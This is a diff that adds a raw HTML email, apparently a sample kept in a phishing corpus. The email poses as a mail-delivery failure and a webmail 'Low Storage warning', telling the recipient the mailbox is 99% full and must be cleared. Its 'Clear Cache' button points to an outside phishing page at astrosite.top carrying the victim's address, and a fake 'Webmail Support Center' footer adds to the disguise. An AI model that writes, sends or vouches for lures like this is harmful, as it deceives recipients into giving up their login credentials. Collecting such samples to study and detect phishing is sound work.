@@ -1,0 +1,298 @@
+Return-Path: skye@brassroyale.com
+Delivered-To: jose@monkey.org
+X-FDA: 83295653574.23.406E112
+Received: from uncle.brassroyale.com (uncle.brassroyale.com [193.222.96.169])
+	by imf18.b.hostedemail.com (Postfix) with ESMTP id AB18C120003
+	for <jose@monkey.org>; Fri,  4 Apr 2025 08:16:05 +0000 (UTC)
+Authentication-Results: imf18.b.hostedemail.com;
+	dkim=pass header.d=brassroyale.com header.s=dkim header.b=bKAiXQYG;
+	spf=pass (imf18.b.hostedemail.com: domain of skye@brassroyale.com designates
+ 193.222.96.169 as permitted sender) smtp.mailfrom=skye@brassroyale.com;
+	dmarc=pass (policy=none) header.from=brassroyale.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;
+	s=arc-20220608; t=1743754566;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=yEEB2VNoCZcNRKm4n/erJM3JtQ71MtDhBuGxt3umQN0=;
+	b=NyxuuuHAqrodfj2neegneekIMme0kCWoTY5dJtuGmdXB1PVJOyUzH3jTlxXLmQ0Te1M6vJ
+	A0zDp4mYB7cIPYxyNfJNxYFOKE5BYODHHWzcdScKqKCjtL/EZ2dmbN70ZE5Ee9P9l36Bbt
+	23lwjZ8s8RKzZbYoPk7tppvWSpMwDYM=
+ARC-Authentication-Results: i=1;
+	imf18.b.hostedemail.com;
+	dkim=pass header.d=brassroyale.com header.s=dkim header.b=bKAiXQYG;
+	spf=pass (imf18.b.hostedemail.com: domain of skye@brassroyale.com designates
+ 193.222.96.169 as permitted sender) smtp.mailfrom=skye@brassroyale.com;
+	dmarc=pass (policy=none) header.from=brassroyale.com
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1743754566; a=rsa-sha256;
+	cv=none;
+	b=zb/8TH1n5Kgk8FDVduNleo+HCnw1xsCEZs/DUmVekyIS0zOKNDmDNi+AICon4FcsyPrK1f
+	6Sb9Q129l19RtRBVtAxo78evRyQbifMfJHQjLotSUCZfQSX19NKAlOjGPYzgtE58MM5oGL
+	ebEu+fWgNpnTxpRCkloFbVG1OSYx3IE=
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=dkim; d=brassroyale.com;
+ h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:Content-Transfer-Encoding;
+ i=skye@brassroyale.com;
+ bh=T+bO7D2UOCAefRUQRmmwPz9opqQ=;
+ b=bKAiXQYGGvb81NLZEQN4nMlq/Y4sTFL2zoIOYxa3n/qcRcdENO292+1hxl9xKgDV8zOPKsd8TjBm
+   8YCDwwDfUfW/u3EuUkxIIsbflxf37JYPPyrSe+LjvCsMnRdzuR/tEtsxuybWSiFjvmzwKSwwVIjI
+   YLXmf29MEtLRTG2hDBr7HTkwVPGNwyZOkVDdrSnBwN1f5pSPJ1UAMpsbxr95NcNHz0KnXfAlriWy
+   OlR83jqZr+0winx2ncTsi5IlSVGlwpxlPD+JDaj1DOuXncy8SWisE4TJLGpsfG0UWISp8ZMydvpO
+   RYyB9JSnWzmgY9DjMoxm0dg/Hw4DFLVItD2h6w==
+DomainKey-Signature: a=rsa-sha1; c=nofws; q=dns; s=dkim; d=brassroyale.com;
+ b=3QzqtwV4O+TN502j5KuWW8fQqcn98t0e94f/BBH0KyPlmIFOE9AEuohy8I9XnoIWBQIDMNzJXsO7
+   fnqg1zyQvzBDCKSqLf+ENkflY7u8yVpn4dPfD233IQLU3TdqR/KwWkK2MSSuRxDI6RAELrhyPlrN
+   02fs9fY8QwZIz/LJ/K7jZF0AD+TDtu394KdvbF6BKJSrKG9YE5f4doszGpRLB/Ms4ATJi6HmYe27
+   HX80JkYt1gbW7x3CadmOIl4XXdEh3xgk0jfsvSwVwOI4QoERbu6tpnrN3vQqzhjs679oiP/vicbW
+   xKAJbIdG2+RPclxLQt2KXOPFu01ylZYJu+Gfnw==;
+From: Mail Delivery Message <skye@brassroyale.com>
+To: jose@monkey.org
+Subject: Mail delivery failed: returning message to sender
+Date: 4 Apr 2025 01:16:02 -0700
+Message-ID: <20250404011602.0AF9262390047BA0@brassroyale.com>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Queue-Id: AB18C120003
+X-Spam-Status: No, score=8.80
+X-Stat-Signature: 46yudeo98fjg4tzwd1mgt73icd85w6ym
+X-Rspam-User: 
+X-Rspamd-Server: rspam09
+X-HE-Tag: 1743754565-999946
+X-HE-Meta: 
+ U2FsdGVkX19decHmqrrdHF7fKnyW88D2kXgjl4tSgm3uIX7LsEAayb66H/PiZgSSkwKjLfC1PRLFG45HBV2xCB4rhcW0QLdlxJCBJEe5RgYdnZZtmevztO5Z6QbvYa9lq5YZLvPL/3dq5X0r2fBar5rzWnCq7ZRySN9f91kWm29eRicTXeuTkwg/t+RXwDLSst68eXIFRvxDa66Zq/E+kYfYawF8fbZBcmnkBPFxdzDR/dKknCYJbWU7HkZMe/8MSyFx50NeXff+7vlTbjNLGegj5HYrzT98lNaql/JPDZeEp8dEheWIvAmIZLYHWTGIhX+NQmcPEGuAfJSPSKt8t33rBoh+mkUdamKAjyefkVnJ5MHT5yNmijUBGKjOQjMaeaM2OAhqmLJ6bti7otLBOwS8SX/pwqeNvCktXi7IgDXk69fyAubE0j+v/21A1NqtKX5TXlOVEyW8WRlm6D0Mg07nMTV8Z45/J4tkVJ56he3hXIM4Syn1kMUhJXh+B9nv2MItCGpHLcd0Wl6dh1OtOf/2BN/3t4Mm5epfETIHtsW/o1lRwsB3q6QmbAyYe0YZHsRbFK8DgxDiWyFybXTsARr9n6VPEnJYlBPGWJh91ZPErm6bOz/NPRoAjZCUDBQGdSMh1dWxrwcAFstNRkqr1BrBcDmEkswLKhJoiZWjhd+qwQnCykNQsBRd2cHb1uR6PIEg97ejZHhDzsIfl9L5RSuUc5GAsmjM2I/ZhsjaLi4+/sAFq2lVehSNr0Kwfps0ylu9Pp2OcnO4bcz/YUfP2aoR4uiOsTgQxw8lt40VoCJ4aJAhRHvYIrGpvyOn1NwTemcZLdwp79t7FXIyZuTUfNtPEiQ/WfaHcUk4p1umiDfJrnoQtcx4yRSSBgxDUcQwFasEzSf26fRolr/XJAc5yc8kV/JZ0J6CX25UacFWHYiG93V2njuL/qyWomvm82cuRxJkmRbC72GA51NqTf1hM6goEUI
+ xy0rv8qj+WouLziXsetcyf5x0/cC2ByevRyqnKAur0MPJonX3p5Hq6VbhaHdlvyVeeRqZnyB6b4bUtEL81EnrPHSUtF9xUFce0mSiryX8lCTwttxTVn70KB2UPzc1ECPGugy+mFzwPbnz7yq+HnAMYGGiX/x4rGuB2a7Gi1j1OsiXVAVsjf2i/yitARNTrU2KWQewzkruLGV/tr1hQcX01nqKtC844zm4F7vGrPtWhoUjH+E=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 129
+
+<html><head>
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.10570.1001">
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body>
+<table width=3D"600" align=3D"center" class=3D"v1v1bodyemail_mr_css_attr" s=
+tyle=3D"background: rgb(255, 255, 255); border: thin solid rgb(235, 235, 23=
+5); border-image: none; width: 600px; text-align: center; color: rgb(44, 54=
+, 58); text-transform: none; letter-spacing: normal; font-family: Arial, He=
+lvetica, sans-serif; font-size: 12px; font-style: normal; font-weight: 400;=
+ word-spacing: 0px; white-space: normal; border-collapse: collapse; box-siz=
+ing: border-box; orphans: 2; widows: 2;=20
+font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
+oke-width: 0px; text-decoration-thickness: initial; text-decoration-style: =
+initial; text-decoration-color: initial;" bgcolor=3D"#ffffff" cellspacing=
+=3D"0" cellpadding=3D"0"><tbody style=3D"box-sizing: border-box;"><tr style=
+=3D"box-sizing: border-box;"><td align=3D"left" valign=3D"top" style=3D"box=
+-sizing: border-box;">
+<table width=3D"100%" style=3D"border-collapse: collapse; box-sizing: borde=
+r-box;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody style=3D"box-sizing: border-box;"><tr style=3D"box-sizing: border-bo=
+x;"><td style=3D"box-sizing: border-box;">
+<table style=3D"border: 1px dotted rgb(211, 211, 211); border-image: none; =
+text-align: left; color: rgb(51, 51, 51); text-transform: none; letter-spac=
+ing: normal; font-family: Roboto, Tahoma, Helvetica, sans-serif; font-size:=
+ 13px; font-style: normal; font-weight: 400; word-spacing: 0px; white-space=
+: normal; border-collapse: collapse; box-sizing: border-box; orphans: 2; wi=
+dows: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: norm=
+al; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
+coration-style: initial; text-decoration-color: initial;"><tbody style=3D"b=
+ox-sizing: border-box;"><tr style=3D"box-sizing: border-box;"><th style=3D"=
+padding: 5px; border: 0px solid rgb(0, 0, 0); border-image: none; width: 2p=
+x; color: rgb(0, 0, 0); box-sizing: border-box; background-color: rgb(2, 15=
+1, 64);">&nbsp;</th>
+<td style=3D"padding: 5px; border: 0px solid rgb(0, 0, 0); border-image: no=
+ne; width: 665px; color: rgb(0, 0, 0); box-sizing: border-box; background-c=
+olor: rgb(243, 255, 248);">
+<span style=3D"font-family: Roboto, Tahoma, Helvetica, sans-serif, serif, E=
+mojiFont; font-size: 12px; box-sizing: border-box;"><span style=3D'font-fam=
+ily: "Segoe UI Symbol"; font-size: small; box-sizing: border-box;'>Secure&n=
+bsp;Notification&nbsp;for jose@monkey.org&nbsp;</span></span></td></tr></tb=
+ody></table><br class=3D"v1Apple-interchange-newline_mr_css_attr" style=3D"=
+box-sizing: border-box;"></td></tr></tbody></table>
+<table width=3D"100%" style=3D"border-collapse: collapse; box-sizing: borde=
+r-box;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody style=3D"bo=
+x-sizing: border-box;"><tr style=3D"box-sizing: border-box;"><td width=3D"2=
+8" style=3D"box-sizing: border-box;"><p align=3D"center" style=3D"margin-to=
+p: 0px; margin-bottom: 1rem; box-sizing: border-box;">&nbsp;</p></td><td st=
+yle=3D"box-sizing: border-box;">
+<table width=3D"100%" style=3D"border-collapse: collapse; box-sizing: borde=
+r-box;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody style=3D"bo=
+x-sizing: border-box;"><tr style=3D"box-sizing: border-box;"><td style=3D"b=
+ox-sizing: border-box;"><table width=3D"100%" style=3D"border-collapse: col=
+lapse; box-sizing: border-box;" border=3D"0" cellspacing=3D"0" cellpadding=
+=3D"0"><tbody style=3D"box-sizing: border-box;"><tr style=3D"box-sizing: bo=
+rder-box;">
+<td align=3D"left" valign=3D"top" style=3D"margin: 0px; color: rgb(214, 4, =
+17); text-transform: uppercase; font-family: Arial, Helvetica, sans-serif; =
+font-size: 18px; font-weight: bold; box-sizing: border-box;">
+<h1 title=3D"Rich Text Editor, MAIN_HEADING" class=3D"v1v1cke_editable_mr_c=
+ss_attr v1v1cke_editable_inline_mr_css_attr v1v1cke_contents_ltr_mr_css_att=
+r v1v1cke_show_borders_mr_css_attr" style=3D"text-align: left; color: rgb(5=
+3, 55, 64); text-transform: none; line-height: 1.2; text-indent: 0px; lette=
+r-spacing: normal; font-family: helvetica, arial, sans-serif; font-size: 2.=
+5rem; font-style: normal; font-weight: 500; margin-top: 0px; margin-bottom:=
+ 0.5rem; word-spacing: 0px; white-space: normal;=20
+box-sizing: border-box; orphans: 2; widows: 2; font-variant-ligatures: norm=
+al; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decorat=
+ion-thickness: initial; text-decoration-style: initial; text-decoration-col=
+or: initial;"><font face=3D"Bookman Old Style" style=3D"box-sizing: border-=
+box;">Low Storage warning!!</font></h1></td></tr></tbody></table>
+<table width=3D"480" style=3D'margin: 0px auto; width: 480px; text-align: l=
+eft; color: rgb(34, 34, 34); text-transform: none; letter-spacing: normal; =
+font-family: "Google Sans", Roboto, Arial, sans-serif; font-size: small; fo=
+nt-style: normal; font-weight: 400; word-spacing: 0px; white-space: normal;=
+ border-collapse: collapse; direction: ltr; box-sizing: border-box; orphans=
+: 2; widows: 2; background-color: rgb(255, 255, 255); font-variant-ligature=
+s: normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
+coration-style: initial; text-decoration-color: initial;' dir=3D"ltr" bgcol=
+or=3D"#ffffff" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody styl=
+e=3D"box-sizing: border-box;"><tr style=3D"box-sizing: border-box;"><td sty=
+le=3D"margin: auto; padding: 0px 20px; box-sizing: border-box;"><table styl=
+e=3D"width: 440px; border-collapse: collapse; box-sizing: border-box;" bord=
+er=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody style=3D"box-sizing: border-box;"><tr style=3D"box-sizing: border-bo=
+x;"><td style=3D'margin: 0px; width: 308px; text-align: left; color: rgb(17=
+9, 20, 18); line-height: 39px; letter-spacing: 0px; font-family: "Google Sa=
+ns", Roboto, Arial, sans-serif; font-size: 26px; vertical-align: top; direc=
+tion: ltr; box-sizing: border-box;' dir=3D"ltr"><p style=3D"margin-top: 0px=
+; margin-bottom: 1rem; box-sizing: border-box;">99%&nbsp;full</p></td>
+<td style=3D'margin: 0px; width: 132px; text-align: right; color: rgb(95, 9=
+9, 104); line-height: 27px; padding-top: 10px; font-family: "Google Sans", =
+Roboto, Arial, sans-serif; font-size: 18px; vertical-align: top; direction:=
+ ltr; box-sizing: border-box;' dir=3D"ltr">0.42&nbsp;MB</td></tr></tbody></=
+table></td></tr></tbody></table>
+<table width=3D"480" style=3D'margin: 0px auto; width: 480px; text-align: l=
+eft; color: rgb(34, 34, 34); text-transform: none; letter-spacing: normal; =
+font-family: "Google Sans", Roboto, Arial, sans-serif; font-size: small; fo=
+nt-style: normal; font-weight: 400; word-spacing: 0px; white-space: normal;=
+ border-collapse: collapse; direction: ltr; box-sizing: border-box; orphans=
+: 2; widows: 2; background-color: rgb(255, 255, 255); font-variant-ligature=
+s: normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
+coration-style: initial; text-decoration-color: initial;' dir=3D"ltr" bgcol=
+or=3D"#ffffff" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody styl=
+e=3D"box-sizing: border-box;"><tr style=3D"box-sizing: border-box;"><td sty=
+le=3D"margin: auto; padding: 0px 20px 6px; box-sizing: border-box;"><table =
+style=3D"width: 440px; border-collapse: collapse; box-sizing: border-box;" =
+border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody style=3D"box-sizing: border-box;"><tr style=3D"box-sizing: border-bo=
+x;"><td height=3D"11" style=3D"margin: 0px; width: 440px; height: 11px; pad=
+ding-top: 6px; box-sizing: border-box;" colspan=3D"2"><table width=3D"100%"=
+ height=3D"3" style=3D"border-radius: 5px; width: 440px; height: 3px; font-=
+size: 0px; border-collapse: collapse; box-sizing: border-box; background-co=
+lor: rgb(212, 212, 212);" bgcolor=3D"#d4d4d4" border=3D"0" cellspacing=3D"0=
+" cellpadding=3D"0"><tbody style=3D"box-sizing: border-box;">
+<tr style=3D"box-sizing: border-box;"><td width=3D"102%" height=3D"3" class=
+=3D"v1v1v1m_-9021155345311721415first_mr_css_attr" style=3D"margin: 0px; wi=
+dth: 440px; height: 3px; overflow: hidden; box-sizing: border-box; border-t=
+op-left-radius: 15px; border-bottom-left-radius: 15px;"><table width=3D"98.=
+56%" height=3D"3" style=3D"width: 433px; height: 7px; border-collapse: coll=
+apse; box-sizing: border-box;" cellspacing=3D"0" cellpadding=3D"0"><tbody s=
+tyle=3D"box-sizing: border-box;"><tr style=3D"box-sizing: border-box;">
+<td width=3D"98.56%" style=3D"border-width: 0px; margin: 0px; width: 433px;=
+ text-align: left; line-height: 3px; font-size: 1px; box-sizing: border-box=
+; background-color: rgb(179, 20, 18);" bgcolor=3D"#ea4335">&nbsp;</td></tr>=
+</tbody></table></td></tr></tbody></table></td></tr></tbody></table>You're =
+running out of storage and may not receive new emails for jose@monkey.org&n=
+bsp; you must clear your cache in other to send and receive new mails.</td>=
+</tr></tbody></table>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<table style=3D"wi=
+dth: 482px; height: 50px; color: rgb(44, 54, 58); text-transform: none; let=
+ter-spacing: normal; font-family: Roboto, sans-serif; font-size: 14px; font=
+-style: normal; font-weight: 400; word-spacing:=20
+0px; white-space: normal; border-collapse: collapse; box-sizing: border-box=
+; orphans: 2; widows: 2; font-variant-ligatures: normal; font-variant-caps:=
+ normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial=
+; text-decoration-style: initial; text-decoration-color: initial;" cellspac=
+ing=3D"0" cellpadding=3D"0"><tbody style=3D"box-sizing: border-box;"><tr st=
+yle=3D"box-sizing: border-box;">
+<td align=3D"center" style=3D"border-radius: 0px; border: 0px solid rgb(34,=
+ 34, 34); border-image: none; height: 50px; box-sizing: border-box; backgro=
+und-color: rgb(17, 85, 204);">
+<a style=3D'padding: 25px 15px; color: rgb(255, 255, 255); line-height: 0; =
+font-family: "Helvetica Neue", Arial; font-size: 16px; font-weight: 400; te=
+xt-decoration: none; display: block; white-space: nowrap; box-sizing: borde=
+r-box; background-color: transparent;' href=3D"https://astrosite.top/tehroo=
+n/validating/mapi/composite/vx68/private/confirm/index.html#jose@monkey.org=
+" target=3D"_blank" rel=3D"noreferrer">
+Clear Cache</a></td></tr></tbody></table></td><td width=3D"12" style=3D"box=
+-sizing: border-box;">&nbsp;</td><td style=3D"box-sizing: border-box;"><tab=
+le align=3D"right" style=3D"border-collapse: collapse; box-sizing: border-b=
+ox;"><tbody style=3D"box-sizing: border-box;"><tr style=3D"box-sizing: bord=
+er-box;"><td width=3D"100%" align=3D"center" style=3D"padding: 10px; vertic=
+al-align: middle; box-sizing: border-box;"></td></tr></tbody></table></td><=
+/tr></tbody></table>
+<p style=3D"margin-top: 0px; margin-bottom: 1rem; box-sizing: border-box;">=
+&nbsp;</p><p style=3D"margin-top: 0px; margin-bottom: 1rem; box-sizing: bor=
+der-box;">&nbsp;</p></td><td width=3D"26" style=3D"box-sizing: border-box;"=
+>&nbsp;</td></tr></tbody></table><table width=3D"100%" style=3D"border-coll=
+apse: collapse; box-sizing: border-box;" border=3D"0" cellspacing=3D"0" cel=
+lpadding=3D"0"><tbody style=3D"box-sizing: border-box;"><tr style=3D"box-si=
+zing: border-box;"><td width=3D"28" style=3D"box-sizing: border-box;">
+<table width=3D"100%" style=3D"border-collapse: collapse; box-sizing: borde=
+r-box;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody style=3D"bo=
+x-sizing: border-box;"><tr style=3D"box-sizing: border-box;"><td style=3D"b=
+ox-sizing: border-box;">&nbsp;</td></tr></tbody></table></td><td align=3D"l=
+eft" valign=3D"top" style=3D"box-sizing: border-box;">
+<table width=3D"100%" id=3D"v1v1DeliveryOptions_mr_css_attr" style=3D"width=
+: 546px; font-family: Arial, Helvetica, sans-serif; font-size: 12px; border=
+-collapse: collapse; box-sizing: border-box;" border=3D"0" cellspacing=3D"3=
+" cellpadding=3D"5"><tbody style=3D"box-sizing: border-box;"><tr style=3D"b=
+ox-sizing: border-box;"><td width=3D"150" align=3D"left" class=3D"v1v1bold_=
+mr_css_attr" valign=3D"top" style=3D"font-weight: bold; box-sizing: border-=
+box;" bgcolor=3D"#f5f5f5">
+<div title=3D"Rich Text Editor, WAYBILL_LABEL" class=3D"v1v1cke_editable_mr=
+_css_attr v1v1cke_editable_inline_mr_css_attr v1v1cke_contents_ltr_mr_css_a=
+ttr v1v1cke_show_borders_mr_css_attr" id=3D"v1v1WAYBILL_LABEL_mr_css_attr" =
+style=3D"box-sizing: border-box;">Receiver Email</div></td><td align=3D"lef=
+t" valign=3D"top" style=3D"box-sizing: border-box;" bgcolor=3D"#f5f5f5">jos=
+e@monkey.org&nbsp;</td></tr><tr style=3D"box-sizing: border-box;">
+<td align=3D"left" class=3D"v1v1bold_mr_css_attr" valign=3D"top" style=3D"f=
+ont-weight: bold; box-sizing: border-box;" bgcolor=3D"#f5f5f5"><div title=
+=3D"Rich Text Editor, ADDRESS_LABEL" class=3D"v1v1cke_editable_mr_css_attr =
+v1v1cke_editable_inline_mr_css_attr v1v1cke_contents_ltr_mr_css_attr v1v1ck=
+e_show_borders_mr_css_attr" id=3D"v1v1ADDRESS_LABEL_mr_css_attr" style=3D"b=
+ox-sizing: border-box;">Date</div></td><td align=3D"left" valign=3D"top" st=
+yle=3D"box-sizing: border-box;" bgcolor=3D"#f5f5f5">
+04/04/2025<br style=3D"box-sizing: border-box;"></td></tr><tr style=3D"box-=
+sizing: border-box;"><td width=3D"150" align=3D"left" class=3D"v1v1bold_mr_=
+css_attr" valign=3D"top" style=3D"font-weight: bold; box-sizing: border-box=
+;" bgcolor=3D"#f5f5f5"><div title=3D"Rich Text Editor, SHIPPER_LABEL" class=
+=3D"v1v1cke_editable_mr_css_attr v1v1cke_editable_inline_mr_css_attr v1v1ck=
+e_contents_ltr_mr_css_attr v1v1cke_show_borders_mr_css_attr" id=3D"v1v1SHIP=
+PER_LABEL_mr_css_attr" style=3D"box-sizing: border-box;">Note</div></td>
+<td align=3D"left" valign=3D"top" style=3D"box-sizing: border-box;" bgcolor=
+=3D"#f5f5f5">Clearing your cache will never affect your datas. please conta=
+ct us if you have any questions.</td></tr></tbody></table><div id=3D"v1v1GO=
+GREEN_BANNER_mr_css_attr" style=3D"box-sizing: border-box;"></div><table wi=
+dth=3D"100%" style=3D"border-collapse: collapse; box-sizing: border-box;" b=
+order=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody style=3D"box-sizing:=
+ border-box;"><tr style=3D"box-sizing: border-box;">
+<td style=3D"box-sizing: border-box;">&nbsp;</td></tr></tbody></table><tabl=
+e width=3D"100%" style=3D"border-collapse: collapse; box-sizing: border-box=
+;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody style=3D"box-siz=
+ing: border-box;"><tr style=3D"box-sizing: border-box;"><td width=3D"160" s=
+tyle=3D"box-sizing: border-box;"></td><td style=3D"box-sizing: border-box;"=
+>&nbsp;</td>
+<td align=3D"right" class=3D"v1v1footer_mr_css_attr" style=3D"text-align: r=
+ight; font-family: Verdana, Geneva, sans-serif; font-size: 10px; box-sizing=
+: border-box;"><div title=3D"Rich Text Editor, FOOTER_TEXT" class=3D"v1v1ck=
+e_editable_mr_css_attr v1v1cke_editable_inline_mr_css_attr v1v1cke_contents=
+_ltr_mr_css_attr v1v1cke_show_borders_mr_css_attr" id=3D"v1v1FOOTER_TEXT_mr=
+_css_attr" style=3D"box-sizing: border-box;">|<span style=3D"box-sizing: bo=
+rder-box;">&nbsp;</span>
+WEBMAIL<span style=3D"box-sizing: border-box;">&nbsp;</span>|<span style=3D=
+"box-sizing: border-box;">&nbsp;</span>PRIVACY NOTICE&nbsp;|&nbsp;</div><br=
+ style=3D"box-sizing: border-box;">2025 Webmail Support Center. All rights =
+reserved.</td></tr></tbody></table></td><td width=3D"26" style=3D"box-sizin=
+g: border-box;">&nbsp;</td></tr></tbody></table></td></tr></tbody></table><=
+/body></html>
+
